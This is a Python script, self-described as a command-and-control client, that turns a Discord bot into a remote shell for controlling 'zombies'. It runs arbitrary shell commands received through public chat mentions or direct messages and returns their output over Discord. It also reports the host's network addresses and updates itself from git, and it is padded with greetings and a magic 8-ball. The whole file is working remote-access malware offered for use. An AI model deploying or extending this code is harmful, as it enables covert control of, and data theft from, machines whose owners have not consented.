'''
Application: chat.py
Author: Andrew Eng
Date: 2020-11-10

Description:
This is a c2 client that communicates via discord.  Enter in your bot token and authorized user id to command and control your zombies.

Usage: python3 chat.py

You can talk directly to the bot or through public chat.  If you are talking on the public chat; the command execution codes are:
@bot_name cmd <command to execute>
If you DM the bot directly, you can say "ip" to get IP address information
CTRL + C to exit the discord connection
Command executions to the bot is logged in chat.log

'''

import discord
import netifaces
from subprocess import Popen, PIPE
import datetime as dt
import random
import time

# Make sure you create a credentials.txt file in your home directory
keys = []
with open('credentials.txt','r') as credentials:
    for eachline in credentials:
        reading = eachline.split(' = ')
        keys.append(reading[1])
credentials.close()

token = keys[0].strip()
authorized_id = keys[1].strip()
authorized_user = keys[2].strip()

# Greetings list
greetings = ['Hello!','Hey there!','What is going on?','WazzzzAAAAAP!','How do you do?','How have you been?','Hey','Long-time no see','Yo!','Wuddup!','Sup','Heyyy...','Whats Crackin?','Howdy!',]

# 8 Ball function just to spice up this command channel
def magicEight():
    eightBall = ['It is certain','Outlook good','You may rely on it','Ask again later','Concentrate and ask again','Reply hazy, try again','My reply is no','My sources say no']
    return random.choice(eightBall)

# Get IP address info
def getIP():
    count = 0
    interfaces = netifaces.interfaces()
    listIP = []
    while count < len(interfaces):
        try:
            listIP.append(f'{interfaces[count]}: {netifaces.ifaddresses(interfaces[count])[netifaces.AF_INET]}')
            count +=1
        except:
            count +=1
    return listIP

client = discord.Client()

@client.event
async def on_ready():
    print('Logged into C2 Server')
    print('CTRL + C to exit\n')

@client.event
async def on_member_join(member):
    await member.create_dm()
    await member.dm_channel.send(f'Hey {member.name}, do you have the right place?')

@client.event
async def on_message(message):
    
    with open('chat.log','a') as chatlog:
        chatlog.write(f'{dt.datetime.now()}, {message.author.name}, {message.content}\n')
    chatlog.close()

    print(f'{message.content}\n')

    if message.author.id == client.user.id:
        return

# Converts the msg content to all lowercase
    msg_content = message.content.lower()

# Greetings
    if msg_content.startswith('hi') or msg_content.startswith('hello'):
        with open('chat.log','a') as log:
            log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {msg_content}\n')
        log.close()
        await message.channel.send(random.choice(greetings))

# Status Check
    if msg_content.startswith('status'):
        with open('chat.log','a') as log:
            log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {msg_content}\n')
        log.close()

        await message.channel.send(f'Yes, I am here...')

# Update
    if msg_content.startswith('update'):
        with open('command.log','a') as log:
            log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {msg_content}\n')
        log.close()

        await message.channel.send(f'Checking for updates...')

        # Kill existing c2 channels
        chat_pid = Popen("ps aux | grep 'chat' | grep -v grep | awk -F '  ' '{print $2}'", shell=True)
        kill_chat = 'kill -9 ' + str(chat_pid)
        git_update = 'git fetch && git reset --hard HEAD && git pull'

        await message.channel.send(f'--- Hey, I will be right back, I am going to do some updates...')
        stdout = Popen(git_update, shell=True, stdout=PIPE).stdout
        output = stdout.read().decode('utf-8').split('\n')
        for eachline in output:
            if bool(eachline) == True:
                await message.channel.send(eachline)

        Popen(kill_chat, shell=True)
        print(f'{dt.datetime.now()}, Update Complete')

# Quick IP Check
    if msg_content.startswith('ip'):
        with open('command.log','a') as log:
            log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {msg_content}\n')
        log.close()

        myIP = getIP()
        count = 0
        while count < len(myIP):
            await message.channel.send(myIP[count])
            count +=1
        await message.channel.send('.... waiting for next commands')

# Monitor the chatroom for keyword "cmd" and execute commands
    if msg_content.startswith('cmd'):
        if message.author.name == authorized_user:
            msg = msg_content.split(' ')
            with open('command.log','a') as log:
                log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {msg_content}\n')
            log.close()
            cmd = ' '.join(msg[1:len(msg)])
            stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
            output = stdout.read().decode('utf-8').split('\n')
            for eachline in output:
                if bool(eachline) == True:
                     await message.channel.send(eachline)

# Lets play magic eightball
    if msg_content.startswith('8ball') or msg_content.startswith('shake'):
        await message.channel.send(f'Ask your question!')
        time.sleep(8)
        await message.channel.send(f'Eightball says:         {magicEight()}')

# Help
    if msg_content.startswith('help'):
        await message.channel.send('... try sending me a message like "@bot cmd <command>"')

# Execute system commands by DM
    if msg_content.startswith(authorized_id):
        # split the messages and create a list
        msg = msg_content.split(' ')

        # Create chat log
        with open('command_dm.log','a') as log:
            log.write(f'{dt.datetime.now()}, [dm], {msg_content}\n')
        log.close()
        
        cmd = ' '.join(msg[2:len(msg)])

        stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
        output = stdout.read().decode('utf-8').split('\n')
        for eachline in output:
            if bool(eachline) == True:
                await message.channel.send(eachline)
        else:
            await message.channel.send('... Sorry, you are not authorized to send commands')

client.run(token)
